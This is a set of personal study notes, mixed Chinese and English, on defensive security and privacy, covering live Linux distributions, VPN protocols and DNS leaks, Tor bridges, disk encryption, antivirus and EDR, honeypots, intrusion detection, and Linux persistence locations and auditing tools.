Puppy linux  
JonDo/Tor-secure-live-DVD  
Tiny core linux  


Tiny core linux :
最小化linux kernel，運行於老舊裝置，最大程度降低可攻擊面  
Puppy linux :
小型，可完全存在於RAM，非專注於安全面  

Knoppix :
第一格專注於LIVE LINUX distributions from disk, CD, DVD, USB. from Debian good for security. Iceweasel:firefox分支

Tails: 
最多使用的LIVE OS designed for preserving security privacy and anonymity.
base on Debian. use default on Tor options.  
Tails is configured to not use the computer's hard disks even if some swap space is on there.

access i2p(Invisible Internet Project), press tap when it boots up, and type "i2p". set configure up.

Tool in tail:
Open PGP: encrypt text, file, in asymmetric


## VPN
Virtual Private Network, 與外部vpn伺服器建立加密通道，後續皆由VPN伺服器向外溝通隱藏後方的client。  
巢狀vpn: 使用vm 作為vpn server, 再連接至外部VPN server or router.
VPN無法辨面server被感染或社交工程 瀏覽器漏洞  

protocol:  
point-to-point tunneling protocol  (PPTP):
* X broken not good   

Layer two tunneling protocol  (L2TP):   
* no encryption, fixed port, easily blocked by filewall, compromise to nation level

Internet protocol security (IPsec):
* have encryption, fixed port, easily blocked by filewall, compromise to nation level

openVPN  
* use openSSL.v3 TLS.v1, port configurable, 可使用其他encryption suites to recompile program.

Secure socket tunneling protocol  (SSTP)  
* only and devlope by microsoft, not recommend

Internet key exchange (IKEv2)  
base on IPsec on mobile. by microsoft, cisco

softEther  

OpenConnect  

VPM server provider: www.ivpn.net

在debain系中，使用network-manager可以幫助VPN在network設定上的方便。  
$apt-get install network-manager-openvpn-gnome

### DNS poisoning
google it: How to spoof DNS in a LAN to Ewdirect Traffic to your fake website

DNScrypt: DNS protocol. It prevents DNS spoofing uses cryptographic signatures


### Prevent VPN drop, or DNS leak
* disable IPv6  
IPv6 偶爾會繞過VPN，當某些VPN不支援IPv6時
* disable add non VPN traffic  
使用 VPN client, block non VPN traffic with VPN client  
* firewall  
Murus firewall: block everythins but VPN  
use linux iptable to block non VPN traffic

windows10 VPN有洩漏DNS的風險，會自動平行輸出網路流量至DNS server. windows 10 VPN User at Big risk of DNS leaks

www.dnskeajtest.com : test DNS leak web

VPN provider (OK) : airVPN, IVPN, nordvpn
free VPN: cyberghostvpn

turnkeylinux: open source VPN application
* turnkeylinux also can 安裝在本地端作為nested VPN，同時支援亞馬遜雲端部屬。


https://www.cloudwards.net/what-are-dns-leaks/

## Tor
Tor 不能防止你被ISP或local network 審查，但可以利用其他方法與配置避免 (bridges change VPN pluggable transport)  
訪問的server side 可以知道正在使用Tor其擁有特別的fingerprint, 並知道exit Tor node.  
無法防止主動接受形式攻擊(開啟PDF)，惡意軟體，瀏覽器漏洞，中間人攻擊，登入(login)網站個人訊息。僅提供匿名性(確保其他服務都通過Tor or block，使其不洩漏身分)  

Tor 中的javascript 可能會洩漏，將設置security level永遠在high，同時能進用js。不要使用extension以避免增加fingerprint

![alt text](Tor.PNG "Tor")

如果ISP業者block了 Tor，Tor提供了 bridges (IP address, ID)來跨越block， bridges 通常會比Tor第一節點(Guard relay)慢。使用不明來源的bridges可能造成流量監視的危險。bridges用為短期work around。

dpi (deep packet inspection)

pluggable-transports:  
可選擇插拔式連接Tor network 避免封包被審查阻擋。在Tor瀏覽器中選network setting - my internet service provider blocks ... - connect with provided bridge:選擇 "obfs4"

obfs4 (obfsproxy) - (means: obfuscate): 使Tor封包的指紋像一般封包或隨機封包來避免審查(dpi)，也有其他的proxy可選。
meek-client: 使封包長得像chrome

## physical usb key
YubiKey


## 磁碟加密
* veraCrypt
* CiperShed
* trueCrypt
* Diskcryptor
* bitlocker

* Symantec Drive Encryption (paid for and closed source)
* Bestcrypt (paid for and closed source)



## anti virus
online scan, viruse source : virustotal

TrendMicro  
housecall  
bitDefender  
Kaspersky  
Panda  
ESET  

EEP : end-pointer proction

EDR: end-pointer-protection, detection & response  
不僅針對防毒，同時偵測系統漏洞，路由設置錯誤，預設權限漏洞，備份，沙盒等整合功能。


## access control model - security frameworks
https://grsecurity.net/compare.php  
SELinux  
AppArmor  
grsecurity

#### new generation AV software
cylance: 
僅提供防惡意軟體簡易漏洞，EDR部分需要其他軟體補足

### honeypots
作為外層網路的誘餌，使用各種通知token使駭客出發通知警告。  
canaryTokens  
OpenCanary  
binarydefense (has github) 
HoneyDrive

### 入侵偵測 IDS (intrusion Detection Sustem)
NIDS (Network Intrusion Detection System)  
Sensors often on mirror or spanning port: 入侵工具通常部屬在 mirror/spanning port。
將switch某個port的流量完全複製到另一個port用以監控分析，稱之為mirror或spanning port。  
SPAN (Switched Port Analyzer) port  

Snort  
Suricate

### HIDS (host intrusion detection system)
installed on the end-point:  
OSSEC  
OSquery  

### Network Analysis (可監控網路流量與內容)
Sguil  
Xplico
NetworkMiner

NST: Network security Toolkit  
網路安全監控分析工具包，可做為live CD的ISO，可直接以虛擬機開啟


## 本機監控
process explorer

sigcheck : 檢測process簽章

autoruns : 能夠檢查開機自動啟動登錄檔(registry)，檢查可疑的紀錄

Process Monitor: 檢查process，登錄檔，事件的工具，能對應process與登錄檔修改關聯。


### network connect
內建工具: netstat



## linux tool - process and network tool
ps 
top
htop
pstree
strace
dtrace
netstat
lsof
tcpdump

sysdig - capturing system events, filtering events  
csysdig - 視圖版本  
監控系統活動，檔案開啟，編輯，各種事件。  
github 有其User guilde可使用  

unhide: 檢查是否有隱藏(hide) PID


## malware tool
rkhunter  
chkrootkti

在debian系統中 經由dpkg的安裝有log紀錄位於 /var/log/dpkg.log  
corn job scheduler 可以週期性執行程式，檢查是否有可疑軟體:  
$crontab -l  
nano /etc/crontab  
檢查所有referece: ls -la /etc/corn*

systemctl list-units -t service    (檢查所有service)  


### linux init process file
rc.sysinit  
/etc/rc.d/ directory,or  
/etc/re.boot/ 

### in old Linux version
/etc/init.d/  
some common service are enabled in  
/etc/inetd.conf  or /etc/xinetd     (depanding on the version of Linux)

### debian 8 jessie 
(The abbreviation "rc" in the context of init scripts and runlevels stands for "runcom" or "run commands." )  

/etc/init.d/rc  
/etc/init.d/rcS  
/usr/sbin/update-rc.d  
/usr/sbin/invoke-rc.d  

Linux kernel modules:  
/lib/modules/"3.16.0-4-amd64"   ("example")  
/etc/modprobe.d

loggin 時自動啟動的位置  
/etc/profile.d  
/etc/profile  
/etc/basj.bashrc  
user account in their home directory:  
~/.bashrc
~/.bash_profile
~/.config/autostart


### osquery : 以資料庫SQL的方式監控系統資源、事件、修改、網路。SQL可以表示出TABLE包含要求的資訊。或在系統遭變更修改時發出提醒警告。

boxcryptor: client side encryption to prevent those providers (cloud: google dropbox onedrive)


open-scap: 工具集、安全策略、稽核集合(CIS security)，安全標準掃描器  
SCAP Workbench

### baseline auditing

baseline auditing: kali openVAS, audit, vulnerability scanner  

Nessus: taneble-7 days free trail- network vulnerability scanner 

Qualys: free online scanner


Linux auditing, vulnerability scanner: $sudo lynis -h (get help)  
lynis: check and scan vulnerability


### windows security tool - Security Compliance Toolkit
https://learn.microsoft.com/zh-tw/windows/security/operating-system-security/device-management/windows-security-configuration-framework/security-compliance-toolkit-10 (SCT)  
(Microsoft Security Compliance Manager - LGOP.exe), Policy Analyzer

